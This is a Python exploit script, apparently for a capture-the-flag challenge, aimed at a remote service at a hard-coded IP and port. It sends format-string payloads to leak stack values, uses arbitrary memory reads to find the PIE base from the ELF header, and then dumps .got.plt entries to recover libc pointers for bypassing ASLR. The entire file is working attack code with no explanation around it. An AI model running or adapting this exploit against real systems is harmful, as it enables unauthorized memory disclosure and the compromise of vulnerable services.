#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for d in range(0,0x20000,0x1000):
        X=start-d; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

s=newconn()
pie=get_pie(s)
print("pie=",hex(pie))
# scan .got.plt region for entries whose %s yields a libc-like pointer (0x70.. bytes)
for off in range(0x3d00, 0x4100, 8):
    X=pie+off
    r=readmem(s,X)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if strb and len(strb)>=4:
        # print any entry with a plausible pointer (non-ASCII, length 5-7 = 0x7f.. / 0x70.. pointer)
        print(f"got+{off:#x} ({hex(X)}): {strb!r}")
s.close()
